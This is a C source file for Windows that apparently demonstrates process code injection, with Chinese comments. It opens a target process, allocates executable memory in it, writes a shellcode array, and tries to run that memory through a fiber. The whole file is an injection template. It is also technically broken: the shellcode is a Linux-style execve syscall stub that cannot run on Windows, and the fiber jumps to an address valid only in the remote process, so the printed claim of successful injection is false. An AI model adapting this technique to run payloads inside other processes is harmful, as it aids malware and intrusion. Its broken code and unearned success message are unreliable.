#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] =
"\x48\x31\xc0\x50\x48\xb8\x63\x61\x6c\x63\x2e\x65\x78\x65\x50"
"\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05";

void WINAPI ShellcodeFiber(LPVOID lpParameter) {
    ((void(*)())lpParameter)();
}

int main() {
    DWORD pid = 1234; // 目标进程ID
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("无法打开目标进程\n");
        return 1;
    }

    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (pRemoteCode == NULL) {
        printf("无法分配内存\n");
        CloseHandle(hProcess);
        return 1;
    }

    if (!WriteProcessMemory(hProcess, pRemoteCode, shellcode, sizeof(shellcode), NULL)) {
        printf("无法写入内存\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    LPVOID pFiber = CreateFiber(0, ShellcodeFiber, pRemoteCode);
    if (pFiber == NULL) {
        printf("无法创建纤程\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    LPVOID pMainFiber = ConvertThreadToFiber(NULL);
    if (pMainFiber == NULL) {
        printf("无法转换线程为纤程\n");
        DeleteFiber(pFiber);
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    SwitchToFiber(pFiber);

    printf("代码注入成功\n");

    DeleteFiber(pFiber);
    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    return 0;
}
